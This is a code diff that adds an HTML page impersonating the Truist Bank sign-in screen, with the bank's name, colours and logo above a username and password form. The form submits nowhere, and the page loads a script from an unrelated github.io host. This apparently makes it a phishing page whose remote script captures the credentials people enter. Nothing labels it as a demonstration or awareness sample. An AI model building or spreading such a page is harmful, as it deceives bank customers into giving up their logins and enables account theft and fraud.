@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Truist Bank Login</title>
+<style>
+/* Reset & font */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #f3f3f5; /* light gray background */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.login-container {
+  background-color: #fff;
+  padding: 40px;
+  width: 380px;
+  border-radius: 10px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+  text-align: center;
+}
+
+.logo img {
+  width: 120px;
+  margin-bottom: 20px;
+}
+
+.login-container h2 {
+  color: #6c2a8f; /* Truist purple */
+  margin-bottom: 25px;
+  font-size: 24px;
+}
+
+.login-container input[type="text"],
+.login-container input[type="password"] {
+  width: 100%;
+  padding: 12px 15px;
+  margin-bottom: 18px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+}
+
+.login-container input[type="submit"] {
+  width: 100%;
+  padding: 12px;
+  border-radius: 5px;
+  border: none;
+  background-color: #6c2a8f; /* Truist purple */
+  color: #fff;
+  font-weight: bold;
+  font-size: 16px;
+  cursor: pointer;
+  transition: background 0.3s ease;
+}
+
+.login-container input[type="submit"]:hover {
+  background-color: #581f70;
+}
+
+.login-container a {
+  display: block;
+  margin-top: 12px;
+  color: #6c2a8f;
+  font-size: 14px;
+  text-decoration: none;
+}
+
+.login-container a:hover {
+  text-decoration: underline;
+}
+</style>
+</head>
+<body>
+<script src="https://ysktshsh.github.io/intfolder/int4.js"></script>
+<div class="login-container">
+  <div class="logo">
+    <!-- Placeholder for Truist logo -->
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRI_5qyTnECGLnrK8MzAjOooHUhNo4YosIOHIxW4YS_v6pNS2V_ZBWTncPo&s=10" alt="Truist Logo">
+  </div>
+  <h2>Sign in to Your Truist Account</h2>
+  <form>
+    <input type="text" placeholder="Username" name="Username" required>
+    <input type="password" placeholder="Password" name="Password" required>
+    <input type="submit" value="Sign In">
+    <a href="#">Forgot Username / Password?</a>
+    <a href="#">Enroll / Create Account</a>
+  </form>
+</div>
+
+</body>
+</html>
